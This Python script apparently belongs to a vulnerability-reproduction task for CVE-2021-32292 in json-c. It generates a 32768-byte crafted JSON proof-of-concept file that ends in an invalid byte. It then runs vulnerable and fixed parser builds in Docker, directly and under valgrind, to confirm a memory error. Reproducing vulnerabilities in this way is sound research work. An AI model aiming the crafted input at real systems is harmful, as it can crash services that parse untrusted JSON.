import subprocess
import os
import sys

def generate_poc():
    print("[*] Generating PoC based on CVE-2021-32292 original report...")
    
    # El issue original usa un archivo que:
    # 1. Tiene exactamente PRINTBUF_BASE_SZ (32768) bytes en el primer read()
    # 2. Termina con un byte que causa error de parseo (no json_tokener_continue)
    
    # Estrategia: JSON con cadena que llena el buffer y termina en caracter inválido
    # El carácter 0x1F (Unit Separator) dentro de una cadena JSON es inválido
    
    # Construir: {"a":"AAAA...\x1F
    # donde el \x1F cae exactamente en el byte 32768
    
    prefix = b'{"a":"'
    suffix = b'\x1f'  # Carácter de control inválido que causará error
    
    # Rellenar con 'A' hasta llegar a 32768 bytes total
    padding_length = 32768 - len(prefix) - len(suffix)
    
    payload = prefix + (b'A' * padding_length) + suffix
    
    assert len(payload) == 32768, f"Payload must be exactly 32768 bytes, got {len(payload)}"
    
    with open("manual_seed.json", "wb") as f:
        f.write(payload)
    
    print(f"    Created manual_seed.json ({len(payload)} bytes)")
    print(f"    First 20 bytes: {payload[:20]}")
    print(f"    Last 20 bytes: {payload[-20:]}")
    print(f"    Byte at position 32767 (last): 0x{payload[-1]:02x}")

def run_target_direct(service_name):
    """Run without valgrind first to see actual behavior"""
    print(f"\n[*] Testing {service_name} (direct, no valgrind)...")
    cmd = [
        "docker", "compose", 
        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
        "run", "--rm", 
        "-v", f"{os.getcwd()}/manual_seed.json:/input/seed.bin",
        service_name,
        "/usr/local/bin/json_parse", "/input/seed.bin"
    ]
    
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    code = result.returncode
    
    if result.stdout:
        print(f"    STDOUT: {result.stdout[:500]}")
    if result.stderr:
        print(f"    STDERR: {result.stderr[:500]}")
    
    icon = "❓"
    if code == 139:
        icon = "💥 SEGFAULT"
    elif code == 0:
        icon = "✅ OK"
    elif code == 1:
        icon = "⚠️  ERROR (non-zero exit)"
    
    print(f"    Exit Code: {code}  {icon}")
    return code

def run_target_valgrind(service_name):
    """Run with valgrind to detect memory errors"""
    print(f"\n[*] Testing {service_name} (with valgrind)...")
    cmd = [
        "docker", "compose", 
        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
        "run", "--rm", 
        "-v", f"{os.getcwd()}/manual_seed.json:/input/seed.bin",
        service_name,
        "valgrind", "--leak-check=no", "--error-exitcode=99", "--track-origins=yes",
        "/usr/local/bin/json_parse", "/input/seed.bin"
    ]
    
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    code = result.returncode
    
    # Look for Invalid read/write in valgrind output
    if "Invalid read" in result.stderr or "Invalid write" in result.stderr:
        print("    ⚠️  Valgrind detected memory error!")
        for line in result.stderr.split('\n'):
            if 'Invalid' in line or 'Address' in line:
                print(f"    {line}")
    
    icon = "❓"
    if code == 99:
        icon = "💥 VALGRIND ERROR"
    elif code == 139:
        icon = "💥 SEGFAULT"
    elif code == 0:
        icon = "✅ OK"
    elif code == 1:
        icon = "⚠️  ERROR"
    
    print(f"    Exit Code: {code}  {icon}")
    return code

def main():
    generate_poc()
    
    print("\n=== PHASE 1: Direct Execution (no valgrind) ===")
    direct_vuln = run_target_direct("target-vuln")
    direct_fixed = run_target_direct("target-fixed")
    
    print("\n=== PHASE 2: With Valgrind ===")
    vg_vuln = run_target_valgrind("target-vuln")
    vg_fixed = run_target_valgrind("target-fixed")
    
    print("\n=== RESULTS ===")
    print(f"Direct execution:")
    print(f"  Vulnerable: exit {direct_vuln}")
    print(f"  Fixed: exit {direct_fixed}")
    print(f"Valgrind execution:")
    print(f"  Vulnerable: exit {vg_vuln}")
    print(f"  Fixed: exit {vg_fixed}")
    
    success = False
    if (direct_vuln == 139 or vg_vuln == 99) and (direct_fixed not in [139, 99] and vg_fixed not in [139, 99]):
        print("\n✅ SUCCESS! Vulnerability confirmed.")
        success = True
    else:
        print("\n❌ Issue not reproduced. Debugging needed.")
        print("\nPossible causes:")
        print("1. Stack size too large (hiding overflow)")
        print("2. PoC not hitting exact boundary condition")
        print("3. json_parse behavior different than expected")
        
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()